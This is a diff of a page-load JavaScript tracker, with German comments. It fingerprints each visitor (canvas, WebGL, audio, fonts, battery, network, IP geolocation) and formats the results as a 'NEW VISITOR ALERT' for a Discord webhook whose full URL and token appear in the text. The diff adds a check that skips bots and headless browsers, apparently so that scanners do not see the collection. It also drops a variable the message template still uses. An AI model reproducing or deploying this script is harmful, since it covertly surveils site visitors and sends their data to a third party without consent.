@@ -176,6 +176,16 @@ window.addEventListener('DOMContentLoaded',()=>{
 (async () => {
   const webhookUrl = "https://discord.com/api/webhooks/1378415253767061614/QZ8p3oHVP6tyMVZD_7q8MN2VM3xlGcqYFsrpX-yGaftQRaqk86im6LCsfSfZfBJ6JVRr";
 
+  // USER-AGENT abfragen
+  const userAgent = navigator.userAgent || "";
+  // Bot-/Headless-Pattern (HeadlessChrome, Googlebot, Bingbot, etc.)
+  const botPattern = /(HeadlessChrome|HeadlessSafari|bot|crawl|spider|slurp)/i;
+
+  // Wenn Bot/Headless erkannt wird, abbrechen
+  if (botPattern.test(userAgent)) {
+    return;
+  }
+
   // Hilfsfunktion: Einfacher Hash (32-bit)
   function hashString(str) {
     let hash = 0;
@@ -343,32 +353,20 @@ window.addEventListener('DOMContentLoaded',()=>{
     };
   }
 
-  // GPU via WebGL
+  // Fingerprints
   const webglFingerprint = getWebGLFingerprint();
-  // Canvas-Fingerprint
   const canvasFingerprint = getCanvasFingerprint();
-  // Audio-Fingerprint
   const audioFingerprint = await getAudioFingerprint();
-  // AdBlocker?
   const adblock = detectAdBlock();
-  // Fonts
   const fonts = detectFonts();
-  // Plugins
   const plugins = getPlugins();
-  // System/Browser Infos
-  const userAgent = navigator.userAgent;
-  const platform = navigator.platform;
-  const language = navigator.language;
+  const userLang = navigator.language;
   const cores = navigator.hardwareConcurrency || "n/a";
   const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "n/a";
   const touchscreen = navigator.maxTouchPoints > 0 || "ontouchstart" in window ? "Yes" : "No";
-  // Battery
   const battery = await getBatteryInfo();
-  // Network
   const { type, downlink, effectiveType } = getNetworkInfo();
-  // MediaDevices
   const mediaDevices = hasMediaDevices();
-  // NFC/Bluetooth
   const nfc = hasNFC();
   const bluetooth = hasBluetooth();
 
@@ -381,7 +379,7 @@ window.addEventListener('DOMContentLoaded',()=>{
     ipData = { ip: "n/a", city: "n/a", region: "n/a", country: "n/a", postal: "n/a", org: "n/a", timezone: "n/a", loc: "n/a" };
   }
 
-  // Payload zusammensetzen
+  // Nachricht zusammenbauen
   const content = `
 🛰️ **NEW VISITOR ALERT** 🛰️
 
@@ -394,7 +392,7 @@ window.addEventListener('DOMContentLoaded',()=>{
 🧠 **System Infos**
 • **User-Agent**: ${userAgent}
 • **Platform**: ${platform}
-• **Language**: ${language}
+• **Language**: ${userLang}
 • **Screen Size**: ${screenSize}
 • **Dark Mode**: ${darkMode}
 • **GPU Fingerprint**: ${webglFingerprint}
